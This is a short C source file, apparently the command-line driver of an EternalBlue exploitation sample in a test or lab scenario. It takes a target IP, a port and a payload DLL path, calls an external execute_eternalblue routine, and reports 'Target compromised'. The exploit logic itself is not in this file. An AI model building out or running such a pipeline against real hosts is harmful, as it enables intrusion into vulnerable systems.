/* samples/eternalblue/main.c
   Amostra de teste (Linux) do cenario EternalBlue.
   Uso: ./eternalblue <IP_ALVO> [PORTA] [PAYLOAD_DLL] */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include "config.h"

int execute_eternalblue(const char *ip, int port, const char *payload_path);

int main(int argc, char *argv[])
{
    const char *ip = (argc > 1) ? argv[1] : TARGET_IP;
    int port = (argc > 2) ? atoi(argv[2]) : TARGET_PORT;
    const char *payload = (argc > 3) ? argv[3] : PAYLOAD_DLL_PATH;
    int rc;

    signal(SIGPIPE, SIG_IGN);

    printf("============================================\n");
    printf("  EternalBlue Pipeline (sample)\n");
    printf("  Target:  %s:%d\n", ip, port);
    printf("  Binary:  %s\n", TARGET_BINARY);
    printf("  DLL:     %s\n", payload);
    printf("============================================\n\n");

    rc = execute_eternalblue(ip, port, payload);

    if (rc == 0) {
        printf("\n[+] Pipeline complete. Target compromised.\n");
    } else {
        printf("\n[-] Pipeline failed (code %d).\n", rc);
    }

    return rc == 0 ? 0 : 1;
}
